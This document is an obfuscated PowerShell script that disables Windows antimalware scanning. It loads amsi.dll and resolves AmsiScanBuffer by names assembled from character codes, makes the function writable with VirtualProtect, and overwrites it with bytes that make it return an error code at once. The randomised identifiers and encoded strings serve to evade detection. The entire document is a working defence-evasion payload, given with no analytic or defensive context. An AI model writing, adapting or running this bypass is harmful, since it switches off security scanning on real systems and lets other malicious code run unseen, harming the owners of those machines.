$I_filURSm = @"
using System;
using System.Runtime.InteropServices;
public class I_filURSm {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr EV4o7hMYlpj1cyzo5uM, string LlZdRQgk0o);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr tNYnf5uBdn, UIntPtr aBd2vy, uint mW1GlhMmMgef2s3vqc, out uint XfVtvbLSHmAKV);
}
"@

Add-Type $I_filURSm

$C_fWTqx = [I_filURSm]::LoadLibrary("$([ChAr](97+65-65)+[Char]([Byte]0x6d)+[ChAR]([byte]0x73)+[cHaR]([BYte]0x69)+[cHar](46*43/43)+[ChAR]([BytE]0x64)+[ChAr](108+7-7)+[Char](108))")
$pu9 = [I_filURSm]::GetProcAddress($C_fWTqx, "$([CHar]([byte]0x41)+[cHaR](51+58)+[cHAR](115+61-61)+[char](69+36)+[cHAr]([byte]0x53)+[chAr]([bytE]0x63)+[chAR](97+95-95)+[CHaR]([ByTe]0x6e)+[cHAr]([BYte]0x42)+[ChAr](117+26-26)+[CHar](51+51)+[ChAR](102+72-72)+[CHAR]([BYTE]0x65)+[chAr](59+55))")
$p = 0
[I_filURSm]::VirtualProtect($pu9, [uint32]5, 0x40, [ref]$p)
$MgeVca2N108 = "0xB8"
$sJyGmQnpnskuEhiK9h5 = "0x57"
$bNyB4G4Hn3hczxyz = "0x00"
$F3cJGkyeYcvIA23VX8 = "0x07"
$E8MrXqk = "0x80"
$_cT2BNNPPqcuPPyhDQ3 = "0xC3"
$NhFxajYrgvJzFHg = [Byte[]] ($MgeVca2N108,$sJyGmQnpnskuEhiK9h5,$bNyB4G4Hn3hczxyz,$F3cJGkyeYcvIA23VX8,+$E8MrXqk,+$_cT2BNNPPqcuPPyhDQ3)
[System.Runtime.InteropServices.Marshal]::Copy($NhFxajYrgvJzFHg, 0, $pu9, 6)